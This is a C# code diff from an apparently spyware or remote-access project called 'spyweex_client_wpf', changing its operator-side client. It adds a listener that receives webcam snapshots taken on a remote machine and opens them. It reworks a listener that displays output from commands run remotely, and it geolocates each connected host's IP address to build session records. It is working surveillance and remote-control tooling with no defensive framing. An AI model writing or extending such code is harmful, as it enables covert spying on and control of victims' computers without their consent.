@@ -26,9 +26,6 @@ namespace spyweex_client_wpf
         public IDisposable subscriberToken;
         public bool isSubscribed = false;
 
-
-        //public abstract void Subscribe(ref WxhtpClient wxhtpClient);
-
         public async void UnsubscribeAsync()
         {
             await Task.Factory.StartNew(() =>
@@ -44,7 +41,7 @@ namespace spyweex_client_wpf
 
     internal class DScreenListener : ISubscriber
     {
-        public void Subscribe(ref WxhtpClient wxhtpClient)
+        public void Subscribe(WxhtpClient wxhtpClient)
         {
             if (isSubscribed) return;
             isSubscribed = true;
@@ -94,15 +91,68 @@ namespace spyweex_client_wpf
         }
     }
 
+    internal class WebCamPicListener : ISubscriber
+    {
+        public void Subscribe(WxhtpClient wxhtpClient)
+        {
+            if (isSubscribed) return;
+            isSubscribed = true;
+            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
+                getObservableSequenceOfReponses().
+                ObserveOn(TaskPoolScheduler.Default).
+                Subscribe(
+                response =>
+                {
+                    Response resp = (Response)response;
+                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_WEBCAM_SCREEN))
+                    {
+                        using (MemoryStream byteStream = new MemoryStream(resp.content))
+                        {
+                            BitmapImage bi = new BitmapImage();
+                            bi.BeginInit();
+                            bi.CacheOption = BitmapCacheOption.OnLoad;
+                            bi.StreamSource = byteStream;
+                            bi.EndInit();
+
+                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
+                            Guid photoID = System.Guid.NewGuid();
+                            String photolocation = photoID.ToString() + ".jpg";  //file name 
+
+                            encoder.Frames.Add(BitmapFrame.Create(bi));
+
+                            using (var filestream = new FileStream(photolocation, FileMode.Create))
+                                encoder.Save(filestream);
+
+                            byteStream.Close();
+                            Process.Start(photolocation);
+
+                        }
+                        Debug.WriteLine("Task Completed");
+                        UnsubscribeAsync();
+                    }
+                },
+                err =>
+                {
+                    Debug.WriteLine((Exception)err);
+                    MessageBoxResult result = MessageBox.Show("Error occured in Webcam screen subscriber " + (Exception)err);
+                    UnsubscribeAsync();
+                }
+
+                );
+            subscriberToken = idisp;
+        }
+    }
+
     internal class CmdExecListener : ISubscriber
     {
-        public void Subscribe(ref WxhtpClient wxhtpClient, MainWindow.updateCmdTextBoxDelegate updateCmdTextBox)
+        public void Subscribe(WxhtpClient wxhtpClient, ConsoleContent dc)
         {
             if(isSubscribed) return;
             isSubscribed = true;
             IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                 getObservableSequenceOfReponses().
-                ObserveOn(TaskPoolScheduler.Default).
+                ObserveOn(Scheduler.CurrentThread).
+                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.COMMAND_PROMPT)).
                 Subscribe(
                 response =>
                 {
@@ -118,16 +168,13 @@ namespace spyweex_client_wpf
                         result = resp.content.ToString();
                     }
 
-                    updateCmdTextBox("", result);
+                    dc.ConsoleOutput.Add(result);
                     UnsubscribeAsync();
 
-                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(
-                    //    () =>
-                    //    {       
-                    //    }
-                    //    ));
-                    //PrintToCmdTextBox("", result);
+                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(() =>
+                    //                                                    {
 
+                    //                                                    }));
                 },
                 err =>
                 {
@@ -200,7 +247,7 @@ namespace spyweex_client_wpf
 
                     IPEndPoint ipEndPoint = (IPEndPoint) wxhtpClient.getTcpClient().Client.RemoteEndPoint;
                     string ip = ipEndPoint.Address.ToString();
-                    var tupleOfGeoData = Utils.GetGeoInfo("89.28.51.5");
+                    var tupleOfGeoData = Utils.GetGeoInfo(ip);
 
 
                     Session s = new Session
